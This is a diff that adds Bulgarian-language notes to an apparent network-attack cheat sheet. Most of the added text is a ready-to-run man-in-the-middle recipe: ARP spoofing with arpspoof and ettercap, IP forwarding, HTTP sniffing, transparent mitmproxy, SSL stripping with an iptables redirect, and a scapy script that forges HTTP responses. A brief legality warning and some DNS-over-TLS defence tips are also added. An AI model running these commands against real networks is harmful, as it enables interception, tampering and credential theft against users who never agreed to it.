@@ -157,6 +157,78 @@ sslstrip -l 8080
 
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
 
+
+##** mitmproxy **##
+Прехващането и емулирането на HTTP заявки и отговори изисква Man-in-the-Middle (MITM) позиция в мрежата:
+
+1. Настройка на MITM атака (ARP Spoofing)
+Първо, трябва да пренасочите трафика през вашата машина:
+
+# ARP Spoofing (жертвата и рутера)
+arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1
+
+# Активиране на IP форуърдинг (за да не блокирате трафика)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+2. Превхващане на HTTP заявки (на ниско ниво)
+С tcpdump (само мониторинг)
+tcpdump -i eth0 -A -s 0 'tcp port 80 and host TARGET_IP'
+Показва HTTP заявки в plaintext.
+
+С ettercap (по-интерактивно)
+ettercap -T -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//
+Може да филтрира и променя съдържание.
+
+3. Емулиране на отговор (Proxy или Python)
+Вариант 1: Използване на mitmproxy
+mitmproxy --mode transparent --showhost
+След ARP spoofing, всички HTTP(s) заявки ще преминат през mitmproxy.
+
+Можете да променяте заявки/отговори в реално време.
+
+Вариант 2: Python + scapy (за напреднали)
+from scapy.all import *
+from scapy.layers.http import HTTPRequest, HTTPResponse
+
+def spoof_response(pkt):
+    if pkt.haslayer(HTTPRequest) and b"example.com" in pkt[HTTPRequest].Host:
+        fake_response = (
+            b"HTTP/1.1 200 OK\r\n"
+            b"Server: fake-server\r\n"
+            b"Content-Type: text/html\r\n"
+            b"\r\n"
+            b"<h1>Hacked!</h1>"
+        )
+        send(IP(dst=pkt[IP].src)/TCP(dport=pkt[TCP].sport)/fake_response, verbose=0)
+
+sniff(iface="eth0", filter="tcp port 80", prn=spoof_response)
+Този код прехваща заявки за example.com и връща фалшив отговор.
+
+4. За HTTPS трафик (SSL Stripping)
+За да прехванете HTTPS, трябва да използвате SSL stripping:
+
+sslstrip -l 8080
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+След това в mitmproxy ще видите декриптиран трафик (ако клиентът не използва HSTS).
+
+5. Инструменти за автоматизация
+Burp Suite (Professional) – Най-добрият инструмент за прехващане и емулиране.
+
+Fiddler – Лесен за употреба HTTP(s) дебъгер.
+
+ZAP (OWASP Zed Attack Proxy) – Безплатен алтернативен Burp.
+
+Важно предупреждение ⚠️
+Използвайте тези техники само в контролирани среди (тестови мрежи, с разрешение).
+
+Превхващането на трафика без съгласието на потребителите е незаконно в повечето държави.
+
+Примерен сценарий за тестване:
+Стартирайте arpspoof и mitmproxy.
+
+В mitmproxy променете отговора на сървъра.
+
+
 ######################
 ###***  Защита  ***###
 ######################
@@ -171,6 +243,17 @@ sudo apt install arpon
 sudo arpon -d -i eth0
 
 ip route show  # търсим съмнителен ip за рутера
+
+# Активирай DNS-over-TLS в браузъра или рутера.
+Cloudflare DNS (DoH/DoT)
+Linux: Добави в /etc/resolv.conf:
+nameserver 1.1.1.1
+nameserver 1.0.0.1
+Windows: Смени DNS на 1.1.1.1 в мрежовите настройки.
+
+Google DNS (8.8.8.8, 8.8.4.4)
+
+Активирай DNS-over-TLS в браузъра или рутера.
 
 ARP Spoofing	Статични ARP записи / VPN / Arpon
 DNS Spoofing	DNS-over-TLS (1.1.1.1) / Cloudflare DNS
